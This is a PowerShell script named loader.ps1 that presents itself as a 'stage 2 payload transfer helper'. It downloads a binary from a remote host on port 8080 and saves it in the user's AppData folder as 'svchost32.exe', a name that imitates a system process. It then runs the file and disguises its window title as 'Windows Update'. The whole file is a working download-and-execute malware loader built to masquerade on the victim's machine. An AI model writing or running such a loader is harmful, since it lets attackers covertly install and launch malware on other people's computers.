<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\loader.ps1
#>
$PayloadUrl = 'http://contoso.com:8080/stage2.bin'
$OutputPath = "$env:APPDATA\svchost32.exe"
$ConnectionTimeout = 38
$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$ResultObject = Invoke-PayloadFetch -SourceUrl $PayloadUrl -DestinationPath $OutputPath -TimeoutSec $ConnectionTimeout -UserAgent $RequestAgent
if ($ResultObject) {
    Start-Process -FilePath $OutputPath
}

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
$Host.UI.RawUI.WindowTitle = "Windows Update"
